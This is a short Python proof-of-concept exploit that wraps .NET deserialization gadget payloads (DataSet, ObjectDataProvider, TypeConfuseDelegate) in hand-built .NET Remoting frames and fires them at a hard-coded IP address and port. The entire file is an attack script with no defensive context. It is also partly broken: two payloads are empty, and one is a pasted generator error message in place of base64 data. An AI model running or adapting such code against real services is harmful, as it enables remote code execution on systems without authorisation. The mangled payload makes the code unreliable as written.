import socket,struct,base64,time,sys
TARGET="138.207.64.28"
PORT=10004
def e(s): b=s.encode();return bytes([1])+struct.pack("<i",len(b))+b
def frame(p):
    h=(struct.pack("<H",6)+bytes([1])+e("application/octet-stream")+struct.pack("<H",4)+bytes([1])+e("ProofOfConcept")+struct.pack("<H",1)+e("__RequestUri")+e("ProofOfConcept")+struct.pack("<H",0))
    return struct.pack("<I",0x54454E2E)+bytes([1,0])+struct.pack("<H",0)*2+struct.pack("<i",len(p))+h+p
def send(name,b64):
    p=base64.b64decode(b64)
    print(f"[*] {name} ({len(p)}B)",flush=True)
    s=socket.socket();s.settimeout(8);s.connect((TARGET,PORT));s.sendall(frame(p))
    r=b"";s.settimeout(2)
    try:
        while True:
            c=s.recv(4096)
            if not c:break
            r+=c
    except:pass
    s.close()
    strs=[];cur=""
    for b in r:
        if 32<=b<127:cur+=chr(b)
        else:
            if len(cur)>=5:strs.append(cur)
            cur=""
    print(f"    {len(r)}B -> {" ".join(strs)[:200]}",flush=True)
    time.sleep(2)

send("DataSet", "")
send("ObjectDataProvider", "Formatter BinaryFormatter not supported by ObjectDataProvider. Supported formatters are: DataContractSerializer (2) , FastJson , FsPickler , JavaScriptSerializer , Json.Net , MessagePackTypeless , MessagePackTypelessLz4 , SharpSerializerBinary , SharpSerializerXml , Xaml (4) , XmlSerializer (2) , YamlDotNet < 5.0.0")
send("TypeConfuseDelegate", "")
